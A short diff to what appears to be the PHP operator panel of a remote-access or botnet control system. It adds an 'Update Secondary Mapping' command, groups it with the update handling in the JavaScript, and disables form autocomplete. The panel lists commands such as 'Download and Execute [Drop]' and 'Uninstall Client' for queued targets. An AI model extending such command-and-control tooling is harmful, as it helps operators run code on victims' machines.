@@ -12,7 +12,7 @@ if($_SESSION['permission']=='Master') {
 	<input type="hidden" name="tab" value="Commands">
 	<input type="hidden" name="silent" value="1">
 </form>
-<form method="post" action="queue.php" class="actionform">
+<form method="post" action="queue.php" class="actionform" autocomplete="off">
 	<h3><p>Perform a Command</p></h3>
 	<p>Target</p>
 	<select id="ptSel" name="Target" style="width: 200px; margin-bottom: 10px; text-align: center;">
@@ -29,6 +29,7 @@ if($_SESSION['permission']=='Master') {
 		<optgroup label="⚗️ Binary Commands">
 			<option>Restart Client</option>
 			<option>Update Client</option>
+			<option>Update Secondary Mapping</option>
 			<option>Uninstall Client</option>
 		</optgroup>
 		<optgroup label="📁 Files">
@@ -53,9 +54,9 @@ if($_SESSION['permission']=='Master') {
 		<br>
 		<p>Parameters</p>
 		<span id="Param1">Param1</span>
-		<input type="text" name="Param1" id="iParam1" style="width: 200px; margin-left: 10px; display: none;"><br>
+		<input type="text" name="Param1" id="iParam1" style="width: 200px; margin-left: 10px; display: none;" autocomplete="off"><br>
 		<span id="Param2">Param1</span>
-		<input type="text" name="Param2" id="iParam2" style="width: 200px; margin-left: 10px; display: none;">
+		<input type="text" name="Param2" id="iParam2" style="width: 200px; margin-left: 10px; display: none;" autocomplete="off">
 	</div><br>
 	<?php
 	if(isset($_GET['success']))
@@ -113,6 +114,7 @@ $(function() {
 				$('#Param1').text('Local Name');
 				paramCount = 1;
 			} break;
+			case 'Update Secondary Mapping':
 			case 'Update Client':
 			case 'Open URL':
 			case 'Download and Execute [Drop]':
